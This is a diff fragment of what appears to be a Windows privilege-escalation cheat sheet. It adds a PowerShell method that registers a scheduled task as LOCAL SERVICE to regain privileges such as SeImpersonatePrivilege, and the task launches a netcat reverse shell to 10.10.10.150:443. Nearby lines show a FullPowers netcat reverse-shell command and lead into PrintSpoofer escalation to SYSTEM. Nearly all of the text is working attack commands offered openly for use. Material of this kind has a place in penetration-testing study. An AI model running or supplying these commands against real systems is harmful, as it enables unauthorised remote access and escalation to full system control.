@@ -304,6 +304,15 @@ Abuse some services executed as `LOCAL SERVICE` or `NETWORK SERVICE` in order to
 ```
 .\fullpw.exe -c ".\nc.exe 10.10.10.150 443 -e powershell" -z
 ```
+Powershell way:
+```
+[System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeShutdownPrivilege", "SeUndockPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege"
+$TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\Windows\Temp\nc64.exe 10.10.10.150 443 -e powershell`""
+Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $TaskPrincipal
+Start-ScheduledTask -TaskName "SomeTask"
+```
+
 #### PrintSpoofer
 Escalate to SYSTEM.
 The token `SeImpersonatePrivilege` is needed to escalate privileges.
